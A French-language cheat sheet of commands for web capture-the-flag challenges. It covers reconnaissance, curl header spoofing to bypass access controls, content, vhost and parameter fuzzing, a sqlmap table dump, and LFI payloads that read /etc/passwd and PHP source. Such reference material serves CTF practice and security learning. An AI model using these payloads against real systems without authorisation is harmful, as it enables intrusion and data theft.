# 🌐 Cheat Sheet — Web CTF

Commandes de référence pour les épreuves web : reconnaissance, injection d'en-têtes HTTP, énumération de contenu / vhosts / paramètres.

---

## 1. Reconnaissance d'une cible web

```bash
whatweb http://cible                     # Technos (CMS, serveur, langages)
whatweb -a 3 http://cible                # Agressif
nikto -h http://cible                    # Scan de vulnérabilités web
wafw00f http://cible                     # Détecter un WAF
curl -sI http://cible                    # En-têtes de réponse (HEAD)
curl -s http://cible | head -n 40        # Début du HTML
curl -s http://cible/robots.txt          # Chemins « interdits » = pistes
```

---

## 2. Injection d'éléments dans l'en-tête avec `curl`

`-H` (ou `--header`) ajoute/écrase un en-tête de **requête**. Très utile pour les épreuves de contrôle d'accès, de spoofing ou de contournement.

```bash
# En-tête générique
curl -s -H "X-Custom: valeur" http://cible

# Plusieurs en-têtes à la fois
curl -s -H "X-Forwarded-For: 127.0.0.1" \
        -H "X-Real-IP: 127.0.0.1" \
        -H "X-Originating-IP: 127.0.0.1" \
        http://cible

# Spoof d'adresse source (contourner un filtrage « admin only localhost »)
curl -s -H "X-Forwarded-For: 127.0.0.1" http://cible/admin

# Changer le Host (virtual hosting / bypass)
curl -s -H "Host: admin.cible.htb" http://IP/

# User-Agent / Referer (filtres qui attendent un UA ou une provenance précise)
curl -s -A "Mozilla/5.0" http://cible                 # -A = User-Agent
curl -s -H "User-Agent: GoogleBot" http://cible
curl -s -e "http://cible/login" http://cible/secret   # -e = Referer
curl -s -H "Referer: http://cible/admin" http://cible

# Cookies / sessions / tokens
curl -s -b "session=abc123; role=admin" http://cible  # -b = envoyer cookies
curl -s -c cookies.txt http://cible/login             # -c = stocker les cookies
curl -s -b cookies.txt http://cible/dashboard         # réutiliser la session
curl -s -H "Authorization: Bearer eyJhbG..." http://cible/api
curl -s -H "Authorization: Basic $(echo -n user:pass | base64)" http://cible

# En-têtes de bypass fréquents en CTF
curl -s -H "X-Forwarded-Host: evil.com" http://cible
curl -s -H "X-Original-URL: /admin" http://cible
curl -s -H "X-Rewrite-URL: /admin" http://cible
curl -s -H "Content-Type: application/json" \
        -X POST -d '{"user":"admin"}' http://cible/api
```

Options de requête utiles :

```bash
-X POST / -X PUT / -X DELETE     # Méthode HTTP
-d 'param=val'                   # Corps de requête (form-urlencoded)
--data-urlencode 'q=a b&c'       # Encode automatiquement
-L                               # Suivre les redirections
-i                               # Afficher les en-têtes + le corps
-v                               # Mode verbeux (voir la requête envoyée)
-k                               # Ignorer les erreurs TLS
-x http://127.0.0.1:8080         # Passer par un proxy (Burp)
```

Débogage complet d'un échange :

```bash
curl -v -L http://cible/page 2>&1 | less      # Voir requête + réponse
```

---

## 3. Énumération de contenu (répertoires / fichiers)

### ffuf (rapide, recommandé)

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://cible/FUZZ
ffuf -w wordlist.txt -u http://cible/FUZZ -e .php,.html,.txt,.bak   # extensions
ffuf -w wordlist.txt -u http://cible/FUZZ -mc 200,301,302          # codes voulus
ffuf -w wordlist.txt -u http://cible/FUZZ -fc 404                  # filtrer 404
ffuf -w wordlist.txt -u http://cible/FUZZ -fs 1234                 # filtrer taille
ffuf -w wordlist.txt -u http://cible/FUZZ -recursion               # récursif
```

### gobuster / feroxbuster / dirb

```bash
gobuster dir -u http://cible -w /usr/share/wordlists/dirb/common.txt -x php,txt
feroxbuster -u http://cible -w wordlist.txt -x php,html
dirb http://cible /usr/share/wordlists/dirb/common.txt
```

---

## 4. Énumération de sous-domaines / vhosts

```bash
# VHost fuzzing : on fait varier le Host (le serveur répond différemment)
ffuf -w subdomains.txt -u http://IP/ -H "Host: FUZZ.cible.htb" -fs 1234

# DNS brute force
gobuster dns -d cible.com -w subdomains.txt

# OSINT passif
sublist3r -d cible.com
amass enum -d cible.com
```

> Astuce HTB/CTF : ajoute la cible dans `/etc/hosts` avant le vhost fuzzing
> `echo "10.10.10.10 cible.htb" | sudo tee -a /etc/hosts`

---

## 5. Énumération de paramètres GET/POST

```bash
# Découvrir des paramètres cachés
arjun -u http://cible/index.php

# Fuzzer la valeur d'un paramètre
ffuf -w wordlist.txt -u "http://cible/page.php?id=FUZZ" -fc 404

# Fuzzer le NOM d'un paramètre
ffuf -w params.txt -u "http://cible/page.php?FUZZ=1" -fs 1234
```

---

## 6. Injections classiques (pour mémoire)

```bash
# SQL injection automatisée
sqlmap -u "http://cible/page.php?id=1" --batch --dbs
sqlmap -u "http://cible/page.php?id=1" -D base -T users --dump

# LFI / path traversal à tester à la main
curl -s "http://cible/page.php?file=../../../../etc/passwd"
curl -s "http://cible/page.php?file=php://filter/convert.base64-encode/resource=index.php"

# Chercher le flag directement
curl -s http://cible/ | grep -ioE "flag\{[^}]*\}"
```

---

## 7. Réflexe méthodologique

1. `whatweb` + `curl -sI` → identifier techno et serveur.
2. `robots.txt`, `/sitemap.xml`, commentaires HTML, fichiers `.bak`/`.git`.
3. Énumération répertoires (`ffuf`) puis vhosts si l'IP répond sur un nom.
4. Tester les bypass d'en-têtes (`X-Forwarded-For`, `Host`, `X-Original-URL`).
5. Repérer les paramètres → tester LFI / SQLi / upload.